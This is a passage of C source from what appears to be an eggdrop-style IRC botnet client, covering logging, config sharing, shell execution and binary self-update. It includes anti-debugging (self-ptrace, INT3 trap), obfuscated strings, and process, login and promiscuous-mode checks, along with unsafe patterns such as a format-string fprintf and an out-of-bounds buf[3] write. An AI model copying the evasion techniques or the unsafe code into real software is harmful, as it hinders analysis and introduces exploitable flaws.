           channel_private(chan) ? "(private)  " : "", !channel_manop(chan) ? "(no manop) " : "", 
           channel_bitch(chan) ? "(bitch)    " : "", channel_closed(chan) ?  "(closed)" : "");
    }
  }
  if (!first)
    dprintf(idx, "%s %s not have access to any channels.\n", handle ? u->handle : "You", handle ? "does" : "do");
Context;

}
int getting_users()
{
  int i;

  for (i = 0; i < dcc_total; i++)
    if ((dcc[i].type == &DCC_BOT) && (dcc[i].status & STAT_GETTING))
      return 1;
  return 0;
}

int prand(int *seed, int range)
{
  long long i1;

  i1 = *seed;
  i1 = (i1 * 0x08088405 + 1) & 0xFFFFFFFF;
  *seed = i1;
  i1 = (i1 * range) >> 32;
  return i1;
}

/*
 *    Logging functions
 */

/* Log something
 * putlog(level,channel_name,format,...);
 */
void putlog EGG_VARARGS_DEF(int, arg1)
{
  int i, type, tsl = 0, dohl = 0; //hl
  char *format, *chname, s[LOGLINELEN], s1[256], *out, ct[81], *s2, stamp[34], buf2[LOGLINELEN]; // *hub, hublog[20], mys[256]
  va_list va;
#ifdef HUB
  time_t now2 = time(NULL);
#endif
  struct tm *t;
#ifdef LEAF
  t = 0;
#endif
  type = EGG_VARARGS_START(int, arg1, va);
  chname = va_arg(va, char *);
  format = va_arg(va, char *);
//The putlog should not be broadcast over bots, @ is *.
  if ((chname[0] == '*'))
    dohl = 1;
#ifdef HUB
  t = localtime(&now2);
  if (shtime) {
    egg_strftime(stamp, sizeof(stamp) - 2, LOG_TS, t);
    strcat(stamp, " ");
   tsl = strlen(stamp);
  }
#endif
 

  /* Format log entry at offset 'tsl,' then i can prepend the timestamp */
  out = s+tsl;

  /* No need to check if out should be null-terminated here,
   * just do it! <cybah>
   */

  egg_vsnprintf(out, LOGLINEMAX - tsl, format, va);
//  egg_vsnprintf(hub, LOGLINEMAX - hl, format, va);

  out[LOGLINEMAX - tsl] = 0;
//  hub[LOGLINEMAX - hl] = 0;
  if (keep_all_logs) {
    if (!logfile_suffix[0])
      egg_strftime(ct, 12, ".%d%b%Y", t);
    else {
      egg_strftime(ct, 80, logfile_suffix, t);
      ct[80] = 0;
      s2 = ct;
      /* replace spaces by underscores */
      while (s2[0]) {
	if (s2[0] == ' ')
	  s2[0] = '_';
	s2++;
      }
    }
  }
  /* Place the timestamp in the string to be printed */
  if ((out[0]) && (shtime)) {
    strncpy(s, stamp, tsl);
    out = s;
  }
  /* if (hub[0]) {
    strncpy(mys, hublog, hl);
    hub = mys;
  }*/

  strcat(out, "\n");
//  strcat(hub, "\n");
  if (!use_stderr) {
    for (i = 0; i < max_logs; i++) {
      if ((logs[i].filename != NULL) && (logs[i].mask & type) &&
	  ((chname[0] == '@') || (chname[0] == '*') || (logs[i].chname[0] == '*') ||
	   (!rfc_casecmp(chname, logs[i].chname)))) {
	if (logs[i].f == NULL) {
	  /* Open this logfile */
	  if (keep_all_logs) {
	    egg_snprintf(s1, 256, "%s%s", logs[i].filename, ct);
	    logs[i].f = fopen(s1, "a+");
	  } else
	    logs[i].f = fopen(logs[i].filename, "a+");
	}
	if (logs[i].f != NULL) {
	  /* Check if this is the same as the last line added to
	   * the log. <cybah>
	   */
          if (!egg_strcasecmp(out + tsl, logs[i].szlast))
	    /* It is a repeat, so increment repeats */
	    logs[i].repeats++;
	  else {
	    /* Not a repeat, check if there were any repeat
	     * lines previously...
	     */
	    if (logs[i].repeats > 0) {
	      /* Yep.. so display 'last message repeated x times'
	       * then reset repeats. We want the current time here,
	       * so put that in the file first.
	       */
              fprintf(logs[i].f, stamp);
	      fprintf(logs[i].f, MISC_LOGREPEAT, logs[i].repeats);
	      
	      logs[i].repeats = 0;
	      /* No need to reset logs[i].szlast here
	       * because we update it later on...
	       */
	    }
	    fputs(out, logs[i].f);
           strncpyz(logs[i].szlast, out + tsl, LOGLINEMAX);
	  }
	}
      }
    }
  }
/* echo line to hubs (not if it was on a +h though)*/

  if (dohl) {
    tand_t *bot;
    struct userrec *ubot;
    sprintf(buf2, "hl %d %s", type, out);
    if (userlist && !loading) {
      for (bot = tandbot ;bot ; bot = bot->next) {
        ubot = get_user_by_handle(userlist, bot->bot);
        if (ubot) {
          if (bot_hublevel(ubot) < 999) {
            putbot(ubot->handle, buf2);
          }
        }
      }
    } else {
      botnet_send_zapf_broad(-1, botnetnick, NULL, buf2);
    }
  }

  for (i = 0; i < dcc_total; i++)
    if ((dcc[i].type == &DCC_CHAT) && (dcc[i].u.chat->con_flags & type)) {
      if ((chname[0] == '@') || (chname[0] == '*') || (dcc[i].u.chat->con_chan[0] == '*') ||
	  (!rfc_casecmp(chname, dcc[i].u.chat->con_chan)))
	dprintf(i, "%s", out);
    }
  if ((!backgrd) && (!con_chan) && (!term_z))
    dprintf(DP_STDOUT, "%s", out);
  else if ((type & LOG_MISC) && use_stderr) {
    if (shtime)
      out += tsl;
    dprintf(DP_STDERR, "%s", s);
  }
  va_end(va);
}

/* Called as soon as the logfile suffix changes. All logs are closed
 * and the new suffix is stored in `logfile_suffix'.
 */
void logsuffix_change(char *s)
{
  int	 i;
  char	*s2 = logfile_suffix;

  debug0("Logfile suffix changed. Closing all open logs.");
  strcpy(logfile_suffix, s);
  while (s2[0]) {
    if (s2[0] == ' ')
      s2[0] = '_';
    s2++;
  }
  for (i = 0; i < max_logs; i++) {
    if (logs[i].f) {
      fflush(logs[i].f);
      fclose(logs[i].f);
      logs[i].f = NULL;
    }
  }
}

void check_logsize()
{
  struct stat ss;
  int i;
/* int x=1; */
  char buf[1024];		/* Should be plenty */

  if (!keep_all_logs && max_logsize > 0) {
    for (i = 0; i < max_logs; i++) {
      if (logs[i].filename) {
	if (stat(logs[i].filename, &ss) != 0) {
	  break;
	}
	if ((ss.st_size >> 10) > max_logsize) {
	  if (logs[i].f) {
	    /* write to the log before closing it huh.. */
	    putlog(LOG_MISC, "*", MISC_CLOGS, logs[i].filename, ss.st_size);
	    fflush(logs[i].f);
	    fclose(logs[i].f);
	    logs[i].f = NULL;
	  }

	  egg_snprintf(buf, sizeof buf, "%s.yesterday", logs[i].filename);
	  buf[1023] = 0;
	  unlink(buf);
	  movefile(logs[i].filename, buf);
	}
      }
    }
  }
}

/* Flush the logfiles to disk
 */
void flushlogs()
{
  int i;

  /* Logs may not be initialised yet. */
  if (!logs)
    return;

  /* Now also checks to see if there's a repeat message and
   * displays the 'last message repeated...' stuff too <cybah>
   */
  for (i = 0; i < max_logs; i++) {
    if (logs[i].f != NULL) {
      if ((logs[i].repeats > 0) && quick_logs) {
         /* Repeat.. if quicklogs used then display 'last message
          * repeated x times' and reset repeats.
	  */
         char stamp[32];
         egg_strftime(&stamp[0], 32, LOG_TS, localtime(&now));
         fprintf(logs[i].f, "%s ", stamp);
	 fprintf(logs[i].f, MISC_LOGREPEAT, logs[i].repeats);
	/* Reset repeats */
	logs[i].repeats = 0;
      }
      fflush(logs[i].f);
    }
  }
}


char *extracthostname(char *hostmask)
{
  char *p = strrchr(hostmask, '@');
  return p ? p + 1 : "";
}

/* Create a string with random letters and digits
 */
void make_rand_str(char *s, int len)
{
  int j, r = 0;

Context;
  for (j = 0; j < len; j++) {
    r = random();
    if (r % 4 == 0)
      s[j] = '0' + (random() % 10);
    else if (r % 4 == 1)
      s[j] = 'a' + (random() % 26);
    else if (r % 4 == 2)
      s[j] = 'A' + (random() % 26);
    else
      s[j] = '!' + (random() % 15);

    if (s[j] == 33 || s[j] == 37 || s[j] == 34 || s[j] == 40 || s[j] == 41 || s[j] == 38 || s[j] == 36) //no % ( ) & 
      s[j] = 35;
    
  }


  s[len] = '\0';
//  s[len] = 0;
}

/* Convert an octal string into a decimal integer value.  If the string
 * is empty or contains non-octal characters, -1 is returned.
 */
int oatoi(const char *octal)
{
  register int i;

  if (!*octal)
    return -1;
  for (i = 0; ((*octal >= '0') && (*octal <= '7')); octal++)
    i = (i * 8) + (*octal - '0');
  if (*octal)
    return -1;
  return i;
}

/* Return an allocated buffer which contains a copy of the string
 * 'str', with all 'div' characters escaped by 'mask'. 'mask'
 * characters are escaped too.
 *
 * Remember to free the returned memory block.
 */
char *str_escape(const char *str, const char div, const char mask)
{
  const int	 len = strlen(str);
  int		 buflen = (2 * len), blen = 0;
  char		*buf = nmalloc(buflen + 1), *b = buf;
  const char	*s;

  if (!buf)
    return NULL;
  for (s = str; *s; s++) {
    /* Resize buffer. */
    if ((buflen - blen) <= 3) {
      buflen = (buflen * 2);
      buf = nrealloc(buf, buflen + 1);
      if (!buf)
	return NULL;
      b = buf + blen;
    }

    if (*s == div || *s == mask) {
      sprintf(b, "%c%02x", mask, *s);
      b += 3;
      blen += 3;
    } else {
      *(b++) = *s;
      blen++;
    }
  }
  *b = 0;
  return buf;
}

/* Search for a certain character 'div' in the string 'str', while
 * ignoring escaped characters prefixed with 'mask'.
 *
 * The string
 *
 *   "\\3a\\5c i am funny \\3a):further text\\5c):oink"
 *
 * as str, '\\' as mask and ':' as div would change the str buffer
 * to
 *
 *   ":\\ i am funny :)"
 *
 * and return a pointer to "further text\\5c):oink".
 *
 * NOTE: If you look carefully, you'll notice that strchr_unescape()
 *       behaves differently than strchr().
 */
char *strchr_unescape(char *str, const char div, register const char esc_char)
{
  char		 buf[3];
  register char	*s, *p;

  buf[3] = 0;
  for (s = p = str; *s; s++, p++) {
    if (*s == esc_char) {	/* Found escape character.		*/
      /* Convert code to character. */
      buf[0] = s[1], buf[1] = s[2];
      *p = (unsigned char) strtol(buf, NULL, 16);
      s += 2;
    } else if (*s == div) {
      *p = *s = 0;
      return (s + 1);		/* Found searched for character.	*/
    } else
      *p = *s;
  }
  *p = 0;
  return NULL;
}

/* As strchr_unescape(), but converts the complete string, without
 * searching for a specific delimiter character.
 */
void str_unescape(char *str, register const char esc_char)
{
  (void) strchr_unescape(str, 0, esc_char);
}

/* Kills the bot. s1 is the reason shown to other bots, 
 * s2 the reason shown on the partyline. (Sup 25Jul2001)
 */
void kill_bot(char *s1, char *s2)
{
#ifdef HUB
  write_userfile(-1);
#endif
  call_hook(HOOK_DIE);
  chatout("*** %s\n", s1);
  botnet_send_chat(-1, botnetnick, s1);
  botnet_send_bye();
  fatal(s2, 0);
}
int isupdatehub()
{
#ifdef HUB
  struct userrec *buser;
  buser = get_user_by_handle(userlist, botnetnick);
  if ((buser) && (buser->flags & USER_UPDATEHUB))
    return 1;
  else
#endif
    return 0;

}
int ischanhub()
{

  struct userrec *buser;
  buser = get_user_by_handle(userlist, botnetnick);
  if ((buser) && (buser->flags & USER_CHANHUB))
    return 1;
  else
    return 0;
}

#ifdef S_DCCPASS
int check_cmd_pass(char *cmd, char *pass) 
{
  struct cmd_pass *cp;

  for (cp = cmdpass; cp; cp = cp->next)
    if (!strcasecmp2(cmd, cp->name)) {
      char tmp[32];

      encrypt_pass(pass, tmp);
      if (!strcmp(tmp, cp->pass))
        return 1;
      return 0;
    }
  return 0;
}

int has_cmd_pass(char *cmd) 
{
  struct cmd_pass *cp;

  for (cp = cmdpass; cp; cp = cp->next)
    if (!strcasecmp2(cmd, cp->name))
      return 1;
  return 0;
}

void set_cmd_pass(char *ln, int shareit) {
  struct cmd_pass *cp;
  char *cmd;

  cmd = newsplit(&ln);
  for (cp = cmdpass; cp; cp = cp->next)
    if (!strcmp(cmd, cp->name))
      break;
  if (cp)
    if (ln[0]) {
      /* change */
      strcpy(cp->pass, ln);
      if (shareit)
        botnet_send_cmdpass(-1, cp->name, cp->pass);
    } else {
      if (cp == cmdpass)
        cmdpass = cp->next;
      else {
        struct cmd_pass *cp2;

        cp2 = cmdpass;
        while (cp2->next != cp)
          cp2 = cp2->next;
        cp2->next = cp->next;
      }
      if (shareit)
        botnet_send_cmdpass(-1, cp->name, "");
      nfree(cp->name);
      nfree(cp);
  } else if (ln[0]) {
    /* create */
    cp = nmalloc(sizeof(struct cmd_pass));
    cp->next = cmdpass;
    cmdpass = cp;
    cp->name = nmalloc(strlen(cmd) + 1);
    strcpy(cp->name, cmd);
    strcpy(cp->pass, ln);
    if (shareit)
      botnet_send_cmdpass(-1, cp->name, cp->pass);
  }
}
#endif

#ifdef S_LASTCHECK
char last_buf[128]="";
#endif

void check_last() {
#ifdef S_LASTCHECK
  char user[20];
  struct passwd *pw;

  if (!strcmp((char *) CFG_LOGIN.ldata ? CFG_LOGIN.ldata : CFG_LOGIN.gdata ? CFG_LOGIN.gdata : "", STR("nocheck")))
    return;

Context;
  pw = getpwuid(geteuid());
Context;
  if (!pw) return;

  strncpy0(user, pw->pw_name ? pw->pw_name : "" , sizeof(user));
  if (user[0]) {
    char *out;
    char buf[50];

    sprintf(buf, STR("last %s"), user);
    if (shell_exec(buf, NULL, &out, NULL)) {
      if (out) {
        char *p;

        p = strchr(out, '\n');
        if (p)
          *p = 0;
        if (strlen(out) > 10) {
          if (last_buf[0]) {
            if (strncmp(last_buf, out, sizeof(last_buf))) {
              char wrk[16384];

              sprintf(wrk, STR("Login: %s"), out);
              detected(DETECT_LOGIN, wrk);
            }
          }
          strncpy0(last_buf, out, sizeof(last_buf));
        }
        nfree(out);
      }
    }
  }
#endif
}

void check_processes()
{
#ifdef S_PROCESSCHECK
  char *proclist,
   *out,
   *p,
   *np,
   *curp,
    buf[1024],
    bin[128];

  if (!strcmp((char *) CFG_BADPROCESS.ldata ? CFG_BADPROCESS.ldata : CFG_BADPROCESS.gdata ? CFG_BADPROCESS.gdata : "", STR("nocheck")))
    return;

  proclist = (char *) (CFG_PROCESSLIST.ldata && ((char *) CFG_PROCESSLIST.ldata)[0] ?
                       CFG_PROCESSLIST.ldata : CFG_PROCESSLIST.gdata && ((char *) CFG_PROCESSLIST.gdata)[0] ? CFG_PROCESSLIST.gdata : NULL);
  if (!proclist)
    return;

  if (!shell_exec(STR("ps x"), NULL, &out, NULL))
    return;

  /* Get this binary's filename */
  strncpy0(buf, binname, sizeof(buf));
  p = strrchr(buf, '/');
  if (p) {
    p++;
    strncpy0(bin, p, sizeof(bin));
  } else {
    bin[0] = 0;
  }
  /* Fix up the "permitted processes" list */
  p = nmalloc(strlen(proclist) + strlen(bin) + 6);
  strcpy(p, proclist);
  strcat(p, " ");
  strcat(p, bin);
  strcat(p, " ");
  proclist = p;
  curp = out;
  while (curp) {
    np = strchr(curp, '\n');
    if (np)
      *np++ = 0;
    if (atoi(curp) > 0) {
      char *pid,
       *tty,
       *stat,
       *time,
        cmd[512],
        line[2048];

      strncpy0(line, curp, sizeof(line));
      /* it's a process line */
      /* Assuming format: pid tty stat time cmd */
      pid = newsplit(&curp);
      tty = newsplit(&curp);
      stat = newsplit(&curp);
      time = newsplit(&curp);
      strncpy0(cmd, curp, sizeof(cmd));
      /* skip any <defunct> procs "/bin/sh -c" crontab stuff and binname crontab stuff */
      if (!strstr(cmd, STR("<defunct>")) && !strncmp(cmd, STR("/bin/sh -c"), 10)
          && !strncmp(cmd, binname, strlen(binname))) {
        /* get rid of any args */
        if ((p = strchr(cmd, ' ')))
          *p = 0;
        /* remove [] or () */
        if (strlen(cmd)) {
          p = cmd + strlen(cmd) - 1;
          if (((cmd[0] == '(') && (*p == ')')) || ((cmd[0] == '[') && (*p == ']'))) {
            *p = 0;
            strcpy(buf, cmd + 1);
            strcpy(cmd, buf);
          }
        }

        /* remove path */
        if ((p = strrchr(cmd, '/'))) {
          p++;
          strcpy(buf, p);
          strcpy(cmd, buf);
        }

        /* skip "ps" */
        if (strcmp(cmd, "ps")) {
          /* see if proc's in permitted list */
          strcat(cmd, " ");
          if ((p = strstr(proclist, cmd))) {
            /* Remove from permitted list */
            while (*p != ' ')
              *p++ = 1;
          } else {
            char wrk[16384];

            sprintf(wrk, STR("Unexpected process: %s"), line);
            detected(DETECT_PROCESS, wrk);
          }
        }
      }
    }
    curp = np;
  }
  nfree(proclist);
  if (out)
    nfree(out);
#endif /* S_PROCESSCHECK */
}

void check_promisc()
{
#ifdef S_PROMISC
#ifdef SIOCGIFCONF
  char buf[8192];
  struct ifreq ifreq,
   *ifr;
  struct ifconf ifcnf;
  char *cp,
   *cplim;
  int sock;

  if (!strcmp((char *) CFG_PROMISC.ldata ? CFG_PROMISC.ldata : CFG_PROMISC.gdata ? CFG_PROMISC.gdata : "", STR("nocheck")))
    return;
  sock = socket(AF_INET, SOCK_STREAM, 0);
  ifcnf.ifc_len = 8191;
  ifcnf.ifc_buf = buf;
  if (ioctl(sock, SIOCGIFCONF, (char *) &ifcnf) < 0) {
    close(sock);
    return;
  }
  ifr = ifcnf.ifc_req;
  cplim = buf + ifcnf.ifc_len;
  for (cp = buf; cp < cplim; cp += sizeof(ifr->ifr_name) + sizeof(ifr->ifr_addr)) {
    ifr = (struct ifreq *) cp;
    ifreq = *ifr;
    if (!ioctl(sock, SIOCGIFFLAGS, (char *) &ifreq)) {
      if (ifreq.ifr_flags & IFF_PROMISC) {
        close(sock);
        detected(DETECT_PROMISC, STR("Detected promiscuous mode"));
        return;
      }
    }
  }
  close(sock);
#endif /* SIOCGIFCONF */
#endif /* S_PROMISC */
}

#ifdef S_ANTITRACE
int traced = 0;

void got_trace(int z)
{
  traced = 0;
}
#endif

void check_trace(int n)
{
#ifdef S_ANTITRACE
  int x,
    parent,
    i;
  struct sigaction sv,
   *oldsv = NULL;

  if (n && !strcmp((char *) CFG_TRACE.ldata ? CFG_TRACE.ldata : CFG_TRACE.gdata ? CFG_TRACE.gdata : "", STR("nocheck")))
    return;
  parent = getpid();
#ifdef __linux__
  egg_bzero(&sv, sizeof(sv));
  sv.sa_handler = got_trace;
  sigemptyset(&sv.sa_mask);
  oldsv = NULL;
  sigaction(SIGTRAP, &sv, oldsv);
  traced = 1;
  asm("INT3");
  sigaction(SIGTRAP, oldsv, NULL);
  if (traced)
    detected(DETECT_TRACE, STR("I'm being traced!"));
  else {
    x = fork();
    if (x == -1)
      return;
    else if (x == 0) {
      i = ptrace(PTRACE_ATTACH, parent, 0, 0);
      if (i == (-1) && errno == EPERM)
        detected(DETECT_TRACE, STR("I'm being traced!"));
      else {
        waitpid(parent, &i, 0);
        kill(parent, SIGCHLD);
        ptrace(PTRACE_DETACH, parent, 0, 0);
        kill(parent, SIGCHLD);
      }
      exit(0);
    } else
      wait(&i);
  }
#endif
#ifdef __FreeBSD__
  x = fork();
  if (x == -1)
    return;
  else if (x == 0) {
    i = ptrace(PT_ATTACH, parent, 0, 0);
    if (i == (-1) && errno == EBUSY)
      detected(DETECT_TRACE, STR("I'm being traced"));
    else {
      wait(&i);
      i = ptrace(PT_CONTINUE, parent, (caddr_t) 1, 0);
      kill(parent, SIGCHLD);
      wait(&i);
      i = ptrace(PT_DETACH, parent, (caddr_t) 1, 0);
      wait(&i);
    }
    exit(0);
  } else
    waitpid(x, NULL, 0);
#endif /* __FreeBSD__ */
#ifdef __OpenBD__
  x = fork();
  if (x == -1)
    return;
  else if (x == 0) {
    i = ptrace(PT_ATTACH, parent, 0, 0);
    if (i == (-1) && errno == EBUSY)
      detected(DETECT_TRACE, STR("I'm being traced"));
    else {
      wait(&i);
      i = ptrace(PT_CONTINUE, parent, (caddr_t) 1, 0);
      kill(parent, SIGCHLD);
      wait(&i);
      i = ptrace(PT_DETACH, parent, (caddr_t) 1, 0);
      wait(&i);
    }
    exit(0);
  } else
    waitpid(x, NULL, 0);
#endif /* __OpenBSD__ */
#endif /* S_ANTITRACE */
}


struct cfg_entry *check_can_set_cfg(char *target, char *entryname)
{
  int i;
  struct userrec *u;
  struct cfg_entry *entry = NULL;

  for (i = 0; i < cfg_count; i++)
    if (!strcmp(cfg[i]->name, entryname)) {
      entry = cfg[i];
      break;
    }
  if (!entry)
    return 0;
  if (target) {
    if (!(entry->flags & CFGF_LOCAL))
      return 0;
    if (!(u = get_user_by_handle(userlist, target)))
      return 0;
    if (!(u->flags & USER_BOT))
      return 0;
  } else {
    if (!(entry->flags & CFGF_GLOBAL))
      return 0;
  }
  return entry;
}

void set_cfg_str(char *target, char *entryname, char *data)
{
  struct cfg_entry *entry;
  int free = 0;

  if (!(entry = check_can_set_cfg(target, entryname)))
    return;
  if (data && !strcmp(data, "-"))
    data = NULL;
  if (data && (strlen(data) >= 1024))
    data[1023] = 0;
  if (target) {
    struct userrec *u = get_user_by_handle(userlist, target);
    struct xtra_key *xk;
    char *olddata = entry->ldata;

    if (u && !strcmp(botnetnick, u->handle)) {
      if (data) {
	entry->ldata = nmalloc(strlen(data) + 1);
	strcpy(entry->ldata, data);
      } else
	entry->ldata = NULL;
      if (entry->localchanged) {
	int valid = 1;

	entry->localchanged(entry, olddata, &valid);
	if (!valid) {
	  if (entry->ldata)
	    nfree(entry->ldata);
	  entry->ldata = olddata;
	  data = olddata;
	  olddata = NULL;
	}
      }
    }
    xk = nmalloc(sizeof(struct xtra_key));
    egg_bzero(xk, sizeof(struct xtra_key));
    xk->key = nmalloc(strlen(entry->name) + 1);
    strcpy(xk->key, entry->name);
    if (data) {
      xk->data = nmalloc(strlen(data) + 1);
      strcpy(xk->data, data);
    }
    set_user(&USERENTRY_CONFIG, u, xk);
    if (olddata)
      nfree(olddata);
  } else {
    char *olddata = entry->gdata;

    if (data) {
      free = 1;
      entry->gdata = nmalloc(strlen(data) + 1);
      strcpy(entry->gdata, data);
    } else
      entry->gdata = NULL;
    if (entry->globalchanged) {
      int valid = 1;

      entry->globalchanged(entry, olddata, &valid);
      if (!valid) {
	if (entry->gdata)
	  nfree(entry->gdata);
	entry->gdata = olddata;
	olddata = NULL;
      }
    }
    if (!cfg_noshare)
      botnet_send_cfg_broad(-1, entry);
    if (olddata)
      nfree(olddata);
  }

//  if (free)
//    nfree(entry->gdata);
}

void userfile_cfg_line(char *ln)
{
  char *name;
  int i;
  struct cfg_entry *cfgent = NULL;

  name = newsplit(&ln);
  for (i = 0; !cfgent && (i < cfg_count); i++)
    if (!strcmp(cfg[i]->name, name))
      cfgent = cfg[i];
  if (cfgent) {
    set_cfg_str(NULL, cfgent->name, ln[0] ? ln : NULL);
  } else
    putlog(LOG_ERRORS, "*", STR("Unrecognized config entry %s in userfile"), name);

}

void got_config_share(int idx, char *ln)
{
  char *name;
  int i;
  struct cfg_entry *cfgent = NULL;

  cfg_noshare++;
  name = newsplit(&ln);
  for (i = 0; !cfgent && (i < cfg_count); i++)
    if (!strcmp(cfg[i]->name, name))
      cfgent = cfg[i];
  if (cfgent) {
    set_cfg_str(NULL, cfgent->name, ln[0] ? ln : NULL);
    botnet_send_cfg_broad(idx, cfgent);
  } else
    putlog(LOG_ERRORS, "*", STR("Unrecognized config entry %s in userfile"), name);
  cfg_noshare--;
}

void add_cfg(struct cfg_entry *entry)
{
  cfg = (void *) user_realloc(cfg, sizeof(void *) * (cfg_count + 1));
  cfg[cfg_count] = entry;
  cfg_count++;
  entry->ldata = NULL;
  entry->gdata = NULL;
}

void trigger_cfg_changed()
{
  int i;
  struct userrec *u;
  struct xtra_key *xk;

  u = get_user_by_handle(userlist, botnetnick);

  for (i = 0; i < cfg_count; i++) {
    if (cfg[i]->flags & CFGF_LOCAL) {
      xk = get_user(&USERENTRY_CONFIG, u);
      while (xk && strcmp(xk->key, cfg[i]->name))
	xk = xk->next;
      if (xk) {
	putlog(LOG_DEBUG, "*", STR("trigger_cfg_changed for %s"), cfg[i]->name ? cfg[i]->name : "(null)");
	if (!strcmp(cfg[i]->name, xk->key ? xk->key : "")) {
	  set_cfg_str(botnetnick, cfg[i]->name, xk->data);
	}
      }
    }
  }
}



int shell_exec(char *cmdline, char *input, char **output, char **erroutput)
{
  FILE *inpFile,
   *outFile,
   *errFile;
  char tmpfile[161];
  int x,
    fd;

  if (!cmdline)
    return 0;
  /* Set up temp files */
  /* always use mkstemp() when handling temp filess! -dizz */
  sprintf(tmpfile, STR("%s.in-XXXXXX"), tempdir);
  if ((fd = mkstemp(tmpfile)) == -1 || (inpFile = fdopen(fd, "w+")) == NULL) {
    if (fd != -1) {
      unlink(tmpfile);
      close(fd);
    }
    putlog(LOG_ERRORS, "*" , STR("exec: Couldn't open %s"), tmpfile);
    return 0;
  }
  unlink(tmpfile);
  if (input) {
    if (fwrite(input, 1, strlen(input), inpFile) != strlen(input)) {
      fclose(inpFile);
      putlog(LOG_ERRORS, "*", STR("exec: Couldn't write to %s"), tmpfile);
      return 0;
    }
    fseek(inpFile, 0, SEEK_SET);
  }
  unlink(tmpfile);
  sprintf(tmpfile, STR("%s.err-XXXXXX"), tempdir);
  if ((fd = mkstemp(tmpfile)) == -1 || (errFile = fdopen(fd, "w+")) == NULL) {
    if (fd != -1) {
      unlink(tmpfile);
      close(fd);
    }
    putlog(LOG_ERRORS, "*", STR("exec: Couldn't open %s"), tmpfile);
    return 0;
  }
  unlink(tmpfile);
  sprintf(tmpfile, STR("%s.out-XXXXXX"), tempdir);
  if ((fd = mkstemp(tmpfile)) == -1 || (outFile = fdopen(fd, "w+")) == NULL) {
    if (fd != -1) {
      unlink(tmpfile);
      close(fd);
    }
    putlog(LOG_ERRORS, "*", STR("exec: Couldn't open %s"), tmpfile);
    return 0;
  }
  unlink(tmpfile);
  x = fork();
  if (x == -1) {
    putlog(LOG_ERRORS, "*", STR("exec: fork() failed"));
    fclose(inpFile);
    fclose(errFile);
    fclose(outFile);
    return 0;
  }
  if (x) {
    /* Parent: wait for the child to complete */
    int st = 0;

    waitpid(x, &st, 0);
    /* Now read the files into the buffers */
    fclose(inpFile);
    fflush(outFile);
    fflush(errFile);
    if (erroutput) {
      char *buf;
      int fs;

      fseek(errFile, 0, SEEK_END);
      fs = ftell(errFile);
      if (fs == 0) {
        (*erroutput) = NULL;
      } else {
        buf = nmalloc(fs + 1);
        fseek(errFile, 0, SEEK_SET);
        fread(buf, 1, fs, errFile);
        buf[fs] = 0;
        (*erroutput) = buf;
      }
    }
    fclose(errFile);
    if (output) {
      char *buf;
      int fs;

      fseek(outFile, 0, SEEK_END);
      fs = ftell(outFile);
      if (fs == 0) {
        (*output) = NULL;
      } else {
        buf = nmalloc(fs + 1);
        fseek(outFile, 0, SEEK_SET);
        fread(buf, 1, fs, outFile);
        buf[fs] = 0;
        (*output) = buf;
      }
    }
    fclose(outFile);
    return 1;
  } else {
    /* Child: make fd's and set them up as std* */
    int ind,
      outd,
      errd;
    char *argv[4];

    ind = fileno(inpFile);
    outd = fileno(outFile);
    errd = fileno(errFile);
    if (dup2(ind, STDIN_FILENO) == (-1)) {
      exit(1);
    }
    if (dup2(outd, STDOUT_FILENO) == (-1)) {
      exit(1);
    }
    if (dup2(errd, STDERR_FILENO) == (-1)) {
      exit(1);
    }
    argv[0] = STR("/bin/sh");
    argv[1] = STR("-c");
    argv[2] = cmdline;
    argv[3] = NULL;
    execvp(argv[0], &argv[0]);
    exit(1);
  }

}




int ucnt = 0;
static void updatelocal(void)
{
#ifdef LEAF
  module_entry *me;
#endif
  Context;
  if (ucnt < 300) {
    ucnt++;
    return;
  } 
  del_hook(HOOK_SECONDLY, (Function) updatelocal);
  ucnt = 0;

  /* let's drop the server connection ASAP */
#ifdef LEAF
  if ((me = module_find("server", 0, 0))) {
    Function *func = me->funcs;
    (func[SERVER_NUKESERVER]) ("Updating...");
  }
#endif

  botnet_send_chat(-1, botnetnick, "Updating...");
  botnet_send_bye();

  fatal("Updating...", 1);
  usleep(2000 * 500);
  bg_send_quit(BG_ABORT);
  unlink(pid_file); //if this fails it is ok, cron will restart the bot, *hopefully*
  system(binname); //start new bot. 
  exit(0);
}

int updatebin (int idx, char *par, int autoi)
{
  char *path = NULL,
   *newbin;
  char buf[2048], old[1024];
  struct stat sb;
  int i;
#ifdef LEAF
  module_entry *me;
#endif

  path = newsplit(&par);
  par = path;
  if (!par[0]) {
    if (idx)
      dprintf(idx, "Not enough parameters.\n");
    return 1;
  }
  path = nmalloc(strlen(binname) + strlen(par));
  strcpy(path, binname);
  newbin = strrchr(path, '/');
  if (!newbin) {
    nfree(path);
    if (idx)
      dprintf(idx, "Don't know current binary name\n");
    return 1;
  }
  newbin++;
  if (strchr(par, '/')) {
    *newbin = 0;
    if (idx)
      dprintf(idx, "New binary must be in %s and name must be specified without path information\n", path);
    nfree(path);
    return 1;
  }
  strcpy(newbin, par);
  if (!strcmp(path, binname)) {
    nfree(path);
    if (idx)
      dprintf(idx, "Can't update with the current binary\n");
    return 1;
  }
  if (stat(path, &sb)) {
    if (idx)
      dprintf(idx, "%s can't be accessed\n", path);
    nfree(path);
    return 1;
  }
  if (chmod(path, S_IRUSR | S_IWUSR | S_IXUSR)) {
    if (idx)
      dprintf(idx, "Can't set mode 0600 on %s\n", path);
    nfree(path);
    return 1;
  }

  //make a backup just in case.

  egg_snprintf(old, sizeof old, "%s.bin.old", tempdir);
  copyfile(binname, old);

  if (movefile(path, binname)) {
    if (idx)
      dprintf(idx, "Can't rename %s to %s\n", path, binname);
    nfree(path);
    return 1;
  }

  sprintf(buf, "%s", binname);
  
#ifdef LEAF
  if (localhub) {
    /* if localhub = 1, this is the spawn bot and controls
     * the spawning of new bots. */

    sprintf(buf, "%s -P %d", buf, getpid());
  } 
#endif

  //safe to run new binary..
#ifdef LEAF
  if (!autoi && !localhub) //dont delete pid for auto update!!!
#endif
    unlink(pid_file); //delete pid so new binary doesnt exit.
#ifdef HUB
  listen_all(my_port, 1); //close the listening port...
#endif
  i = system(buf);
  if (i == -1 || i == 1) {
    if (idx)
      dprintf(idx, "Couldn't restart new binary (error %d)\n", i);
      putlog(LOG_MISC, "*", "Couldn't restart new binary (error %d)\n", i);
    return i;

  } else {

#ifdef LEAF
    if (!autoi && !localhub) {
      /* let's drop the server connection ASAP */
      if ((me = module_find("server", 0, 0))) {
        Function *func = me->funcs;
        (func[SERVER_NUKESERVER]) ("Updating...");
      }
#endif
      if (idx)
        dprintf(idx, "Updating...bye\n");
      putlog(LOG_MISC, "*", "Updating...\n");
      botnet_send_chat(-1, botnetnick, "Updating...");
      botnet_send_bye();
